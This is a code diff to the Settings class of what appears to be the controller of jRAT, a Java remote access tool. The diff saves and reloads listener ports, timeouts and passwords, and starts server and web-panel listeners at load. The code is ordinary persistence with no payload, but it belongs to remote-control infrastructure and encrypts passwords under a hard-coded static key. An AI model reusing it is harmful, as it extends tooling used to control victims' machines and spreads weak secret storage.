@@ -3,15 +3,24 @@ package io.jrat.controller.settings;
 import com.cedarsoftware.util.io.JsonObject;
 import com.cedarsoftware.util.io.JsonReader;
 import com.cedarsoftware.util.io.JsonWriter;
+import io.jrat.common.crypto.Crypto;
+import io.jrat.common.crypto.KeyUtils;
 import io.jrat.controller.Globals;
+import io.jrat.controller.exceptions.InvalidSocketTypeException;
+import io.jrat.controller.net.PortListener;
+import io.jrat.controller.net.ServerListener;
 import io.jrat.controller.ui.Columns;
+import io.jrat.controller.webpanel.WebPanelListener;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.OutputStreamWriter;
 import java.io.PrintWriter;
+import java.io.Serializable;
+import java.net.BindException;
 import java.util.HashMap;
 import java.util.Map;
+import javax.swing.JOptionPane;
 
 
 public class Settings extends AbstractStorable {
@@ -66,6 +75,20 @@ public class Settings extends AbstractStorable {
 			args.put(JsonReader.USE_MAPS, true);
 
 			settings = (JsonObject) JsonReader.jsonToJava(new FileInputStream(getFile()), args);
+
+			Map<String, Map<String, Object>> sockets = (HashMap<String, Map<String, Object>>) settings.get("sockets");
+
+			for (String key : sockets.keySet()) {
+				Map<String, Object> socket = sockets.get(key);
+
+				int port = ((Long) socket.get("port")).intValue();
+				int timeout = ((Long) socket.get("timeout")).intValue();
+				int type = ((Long) socket.get("type")).intValue();
+				String pass = Crypto.decrypt((String) socket.get("pass"), KeyUtils.STATIC_KEY.getEncoded());
+
+				SocketEntry se = new SocketEntry(key, port, timeout, pass, type);
+				se.start(); // TODO - Settings are loaded before main frame, cannot add sockets to table
+			}
 		} catch (Exception ex) {
 			ex.printStackTrace();
 		}
@@ -78,6 +101,21 @@ public class Settings extends AbstractStorable {
 	public void save() throws Exception {
 		try {
 			PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(getFile())));
+
+			Map<String, Map<String, Object>> sockets = (HashMap<String, Map<String, Object>>) settings.get("sockets");
+
+			// Save fresh socket data
+			for (int i = 0; i < PortListener.listeners.size(); i++) {
+				PortListener pl = PortListener.listeners.get(i);
+
+				Map<String, Object> socketData = new HashMap<String, Object>();
+				sockets.put(pl.getName(), socketData);
+
+				socketData.put("port", pl.getPort());
+				socketData.put("timeout", pl.getTimeout());
+				socketData.put("type", pl.getType());
+				socketData.put("pass", Crypto.encrypt(pl.getPass(), KeyUtils.STATIC_KEY.getEncoded()));
+			}
 
 			Map args = new HashMap();
 			args.put(JsonWriter.TYPE, false);
@@ -115,10 +153,76 @@ public class Settings extends AbstractStorable {
 		for (Columns c : Columns.values()) {
 			columns.put(c.getName(), c.isDefault());
 		}
+
+		settings.put("sockets", new HashMap());
 	}
 
 	@Override
 	public File getFile() {
 		return new File(Globals.getSettingsDirectory(), "settings.json");
+	}
+
+	public class SocketEntry implements Serializable {
+
+		private static final long serialVersionUID = -2000514812654090252L;
+
+		private int type;
+		private String pass;
+		private int timeout;
+		private int port;
+		private String name;
+
+		public SocketEntry(String name, int port, int timeout, String pass, int type) {
+			this.name = name;
+			this.port = port;
+			this.timeout = timeout;
+			this.pass = pass;
+			this.type = type;
+		}
+
+		public String getPass() {
+			return pass;
+		}
+
+		public int getTimeout() {
+			return timeout;
+		}
+
+		public int getPort() {
+			return port;
+		}
+
+		public String getName() {
+			return name;
+		}
+
+		public int getType() {
+			return type;
+		}
+
+		public void start() {
+			try {
+				if (type == SocketType.NORMAL_SOCKET) {
+					ServerListener connection = new ServerListener(name, port, timeout, pass);
+					connection.start();
+				} else if (type == SocketType.WEB_PANEL_SOCKET) {
+					WebPanelListener wpl = new WebPanelListener(name, port, pass);
+					wpl.start();
+				} else {
+					throw new InvalidSocketTypeException();
+				}
+			} catch (BindException e) {
+				JOptionPane.showMessageDialog(null, "Port " + port + " is already in use", "jRAT", JOptionPane.ERROR_MESSAGE);
+				e.printStackTrace();
+			} catch (Exception e) {
+				e.printStackTrace();
+			}
+		}
+
+	}
+
+	public class SocketType {
+		public static final int NORMAL_SOCKET = 0;
+		public static final int WEB_PANEL_SOCKET = 1;
 	}
 }
